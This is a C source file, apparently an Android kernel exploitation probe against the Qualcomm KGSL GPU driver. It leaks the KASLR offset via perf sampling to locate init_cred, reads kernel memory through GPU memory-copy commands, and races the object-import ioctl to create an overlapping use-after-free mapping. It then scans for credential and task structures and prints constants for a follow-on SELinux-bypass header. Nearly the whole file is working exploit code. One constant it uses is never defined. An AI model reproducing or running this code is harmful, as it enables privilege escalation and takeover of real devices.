#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <poll.h>
#include <sys/wait.h>
#include <signal.h>
#include <time.h>
#include <inttypes.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define SCAN_DWORDS 560
#define CP_NOP 0x10
#define CP_MEM_TO_MEM 0x73
#define CP_MEM_WRITE 0x3D

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define SPRAY_PIDS 2000
#define VMLINUX_TEXT 0xffffffc010080000ULL

static int kgsl_fd = -1;
static volatile int dc_civac_works = -1;

static void die(const char *msg) { perror(msg); exit(1); }

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static void sigill_handler(int sig) { dc_civac_works = 0; }

static void try_dc_civac(void *addr) {
    if (dc_civac_works == 0) return;
    void *old = signal(SIGILL, sigill_handler);
    __sync_synchronize();
    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
    asm volatile("dsb sy" : : : "memory");
    __sync_synchronize();
    signal(SIGILL, old);
    if (dc_civac_works == -1) dc_civac_works = 1;
}

static void flush_dc_civac_range(void *start, size_t len) {
    if (dc_civac_works != 1) return;
    char *p = (char*)((uintptr_t)start & ~63);
    char *end = (char*)((uintptr_t)start + len);
    for (; p < end; p += 64) try_dc_civac(p);
}

static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;

    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size); close(fd);
    printf("    kernel_samples=%d\n", n_ips);

    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }

    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
    uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
    printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
        (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)ic_addr);
    return ic_addr;
}

static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) {
        if (gpuaddr) *gpuaddr = inf.gpuaddr;
        if (flags) *flags = inf.flags;
    }
    return ret;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static int gpu_write_dst(uint64_t dst_ga, uint64_t val) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t dl, dh;
    split64(dst_ga, &dl, &dh);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = dl; cmd[dw++] = dh;
    split64(val, &dl, &dh);
    cmd[dw++] = dl; cmd[dw++] = dh;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    return dw;
}

static int gpu_read_kernel(uint64_t va, uint64_t *out, int count) {
    if (kgsl_fd < 0) return -1;
    int ib_id = gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga, NULL);
    int dst_id = gpuobj_alloc(0x4000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga, NULL);
    unsigned int ctx = create_context();

    memset(ib_m, 0, 0x10000);
    memset(dst_m, 0, 0x4000);
    uint32_t *cmd = (uint32_t *)ib_m;
    int dw = 0;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    for (int i = 0; i < count; i++) {
        uint32_t dl, dh, sl, sh;
        split64(dst_ga + i*8, &dl, &dh);
        split64(va + i*8, &sl, &sh);
        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
        cmd[dw++] = sl; cmd[dw++] = sh;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx, ib_ga, dw*4, ib_id, &ts) < 0) { munmap(ib_m,0x10000); munmap(dst_m,0x4000); gpuobj_free(ib_id); gpuobj_free(dst_id); return -2; }
    if (wait_timestamp(ctx, ts) < 0) { munmap(ib_m,0x10000); munmap(dst_m,0x4000); gpuobj_free(ib_id); gpuobj_free(dst_id); return -3; }
    __sync_synchronize();
    uint64_t *data = (uint64_t *)dst_m;
    for (int i = 0; i < count; i++) out[i] = data[i];
    munmap(ib_m, 0x10000);
    munmap(dst_m, 0x4000);
    gpuobj_free(ib_id);
    gpuobj_free(dst_id);
    return 0;
}

static void test_gpu_read(uint64_t addr, const char *name) {
    uint64_t buf[4];
    int ret = gpu_read_kernel(addr, buf, 4);
    if (ret == 0) {
        printf("  GPU read %s at 0x%lX: ", name, (unsigned long)addr);
        for (int i=0; i<4; i++) printf("%016lX ", (unsigned long)buf[i]);
        printf("\n");
    } else {
        printf("  GPU read %s failed (ret=%d)\n", name, ret);
    }
}

static void test_write_dst(uint64_t dst_ga, uint64_t *dst_m) {
    uint32_t cmd[32];
    int dw = 0;
    uint32_t dl, dh;
    split64(dst_ga, &dl, &dh);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = dl; cmd[dw++] = dh;
    cmd[dw++] = 0xDEADBEEF; cmd[dw++] = 0xCAFEBABE;
    split64(dst_ga + 8, &dl, &dh);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = dl; cmd[dw++] = dh;
    cmd[dw++] = 0x12345678; cmd[dw++] = 0x9ABCDEF0;
    cmd[dw++] = cp_type7(CP_NOP, 0);

    int ib_id = gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga, NULL);
    unsigned int ctx = create_context();

    memcpy(ib_m, cmd, dw*4);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx, ib_ga, dw*4, ib_id, &ts) == 0) {
        wait_timestamp(ctx, ts);
        __sync_synchronize();
    }
    munmap(ib_m, 0x10000);
    gpuobj_free(ib_id);
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("=== ULTRA ANALYZER v2 — GPU Deep Probe ===\n\n");

    struct utsname u;
    uname(&u);
    printf("System: %s %s %s\n", u.sysname, u.nodename, u.release);

    printf("[*] Opening /dev/kgsl-3d0...\n");
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("  kgsl fd=%d\n", kgsl_fd);

    printf("[*] Checking dc civac support...\n");
    try_dc_civac((void*)&kgsl_fd);
    printf("  dc civac %s\n", dc_civac_works == 1 ? "works" : (dc_civac_works == 0 ? "not supported" : "unknown"));

    printf("[*] KASLR detection via perf...\n");
    uint64_t init_cred_addr = detect_kaslr();
    printf("  estimated init_cred=0x%lX\n", (unsigned long)init_cred_addr);

    printf("[*] Allocating test objects...\n");
    int ib_id = gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0, ib_flags = 0;
    gpuobj_info(ib_id, &ib_ga, &ib_flags);
    printf("  IB id=%d gpuaddr=0x%lX flags=0x%lX cache=%lu\n",
        ib_id, (unsigned long)ib_ga, (unsigned long)ib_flags,
        (unsigned long)(ib_flags & KGSL_CACHEMODE_MASK));

    int dst_id = gpuobj_alloc(0x4000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    uint64_t dst_ga = 0, dst_flags = 0;
    gpuobj_info(dst_id, &dst_ga, &dst_flags);
    printf("  DST id=%d gpuaddr=0x%lX flags=0x%lX cache=%lu\n",
        dst_id, (unsigned long)dst_ga, (unsigned long)dst_flags,
        (unsigned long)(dst_flags & KGSL_CACHEMODE_MASK));

    unsigned int ctx = create_context();
    printf("  Context id=%u\n", ctx);

    printf("[*] Testing GPU write to DST (CP_MEM_WRITE)...\n");
    test_write_dst(dst_ga, dst_m);
    uint64_t v0 = *(volatile uint64_t*)dst_m;
    uint64_t v1 = *(volatile uint64_t*)(dst_m + 8);
    printf("  DST[0]=0x%016lX DST[1]=0x%016lX\n", (unsigned long)v0, (unsigned long)v1);
    if (v0 == 0xCAFEBABEDEADBEEFULL && v1 == 0x9ABCDEF012345678ULL) {
        printf("  [OK] CPU sees GPU write.\n");
    } else {
        printf("  [FAIL] CPU does NOT see GPU write (cache coherency issue).\n");
        printf("  Attempting dc civac flush...\n");
        flush_dc_civac_range(dst_m, 16);
        v0 = *(volatile uint64_t*)dst_m;
        v1 = *(volatile uint64_t*)(dst_m + 8);
        printf("  After flush: DST[0]=0x%016lX DST[1]=0x%016lX\n", (unsigned long)v0, (unsigned long)v1);
    }

    printf("[*] Testing GPU read (CP_MEM_TO_MEM) from user-space (dst_m)...\n");
    uint64_t user_buf[2];
    user_buf[0] = 0x123456789ABCDEF0ULL;
    user_buf[1] = 0xFEDCBA9876543210ULL;
    uint64_t read_user[2];
    memset(read_user, 0, 16);
    if (gpu_read_kernel((uint64_t)user_buf, read_user, 2) == 0) {
        printf("  read_user[0]=0x%016lX [1]=0x%016lX\n", (unsigned long)read_user[0], (unsigned long)read_user[1]);
        if (read_user[0] == user_buf[0] && read_user[1] == user_buf[1])
            printf("  [OK] GPU read from user-space works.\n");
        else
            printf("  [FAIL] GPU read from user-space returns wrong data.\n");
    } else {
        printf("  GPU read from user-space failed.\n");
    }

    printf("[*] Testing GPU read from kernel address (init_cred)...\n");
    if (init_cred_addr) {
        test_gpu_read(init_cred_addr, "init_cred");
    } else {
        printf("  init_cred not known, skipping.\n");
    }
    printf("[*] Testing GPU read from _stext (estimated base)...\n");
    uint64_t stext_est = (init_cred_addr) ? (init_cred_addr - 0x26fa738) : 0xffffffef1fa00000;
    test_gpu_read(stext_est, "_stext");

    printf("[*] Testing GPU read from 0xFFFFFFC000000000 (common kernel mapping)...\n");
    test_gpu_read(0xFFFFFFC000000000ULL, "highmem");

    printf("[*] Testing KGSL_GPUOBJ_IMPORT ioctl (useraddr)...\n");
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = (uint64_t)(uintptr_t)&user_buf };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = sizeof(uaddr),
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    int import_ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    if (import_ret == 0) {
        printf("  IMPORT succeeded, id=%u\n", imp.id);
        gpuobj_free(imp.id);
    } else {
        printf("  IMPORT failed: errno=%d\n", errno);
    }

    printf("[*] Attempting to create race condition (import thread)...\n");
    volatile int race_done = 0;
    pthread_t thr;
    struct kgsl_gpuobj_import_useraddr uaddr2 = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp2 = {
        .priv = (uint64_t)&uaddr2,
        .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    void *race_thread(void *arg) {
        while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp2);
        return NULL;
    }
    if (pthread_create(&thr, NULL, race_thread, NULL) == 0) {
        int ov_id = gpuobj_alloc(OVERLAP_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
        int hit = 0;
        for (int i=0; i<1000000; i++) {
            void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
                PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
                kgsl_fd, (off_t)ov_id << 12);
            if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit=1; break; }
            if (errno == ENODEV) { hit=1; break; }
        }
        race_done = 1;
        pthread_join(thr, NULL);
        printf("  Race %s\n", hit ? "won (overlap mapped)" : "lost");
        gpuobj_free(ov_id);
    } else {
        printf("  pthread_create failed\n");
    }

    printf("[*] Scanning for task_struct/cred patterns in UAF area...\n");
    uint64_t scan_start = UAF_ADDR + 0x2000;
    uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
    uint64_t task_pages[32], cred_pages[32];
    int n_task=0, n_cred=0;
    uint32_t temp_buf[SCAN_DWORDS];
    for (uint64_t va = scan_start; va < scan_end; va += 0x1000) {
        if (gpu_read_kernel(va, (uint64_t*)temp_buf, SCAN_DWORDS/2) == 0) {
            int nz=0, has_comm=0, has_cred=0;
            for (int i=0; i<SCAN_DWORDS; i++) if (temp_buf[i]) nz++;
            for (int i=0; i<SCAN_DWORDS-1; i++)
                if (temp_buf[i]==0x4B534154 && temp_buf[i+1]==0x21464155) has_comm=1;
            for (int i=0; i<SCAN_DWORDS-8; i++) {
                int cnt=0;
                for (int j=0; j<8; j++) if (temp_buf[i+j]==0x000007D0) cnt++;
                if (cnt>=4) { has_cred=1; break; }
            }
            if (has_comm && n_task<32) {
                task_pages[n_task++] = va;
                printf("  TASK at 0x%lX (nz=%d)\n", (unsigned long)va, nz);
            }
            if (has_cred && n_cred<32) {
                cred_pages[n_cred++] = va;
                printf("  CRED at 0x%lX (nz=%d)\n", (unsigned long)va, nz);
            }
        }
    }
    printf("  Found %d task_struct pages, %d cred pages\n", n_task, n_cred);

    if (n_cred>0) {
        printf("[*] Dumping first cred page (48 dwords)...\n");
        uint64_t cred_va = cred_pages[0];
        uint64_t cred_data[48];
        if (gpu_read_kernel(cred_va, cred_data, 48) == 0) {
            for (int i=0; i<48; i++) {
                if (i%8==0) printf("\n  +0x%02X:", i*4);
                printf(" %08X", (uint32_t)cred_data[i]);
            }
            printf("\n");
        }
    }

    printf("\n[*] === RECOMMENDED MACROS FOR avc_bypass.h ===\n");
    printf("#define UAF_ADDR  0x7001ff000ULL\n");
    printf("#define UAF_SIZE  0x10004000ULL\n");
    printf("#define OVERLAP_ADDR 0x7001fe000ULL\n");
    printf("#define OVERLAP_SIZE 0x7000ULL\n");
    printf("#define BOGUS_ADDR 0x700204000ULL\n");
    printf("#define BOGUS_SIZE 0xffffffffffefd000ULL\n");
    printf("#define PLACEHOLDER_ADDR 0x710204000ULL\n");
    printf("#define PLACEHOLDER_SIZE 0x10400000ULL\n");
    printf("#define AVC_NODE_STRIDE  72\n");
    printf("#define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)\n");
    printf("#define AVC_PAGES_PER_IB 12\n");
    printf("#define AVC_LOOP_SECONDS 150\n");
    printf("#define SPRAY_PIDS 2000\n");
    if (init_cred_addr) {
        printf("// init_cred address: 0x%lX\n", (unsigned long)init_cred_addr);
        printf("// Use: #define VMLINUX_INIT_CRED 0x%lX\n", (unsigned long)(init_cred_addr - (init_cred_addr - VMLINUX_TEXT) & ~0x1FFFFFULL));
    }

    printf("\n[*] GPU probe completed.\n");
    close(kgsl_fd);
    return 0;
}
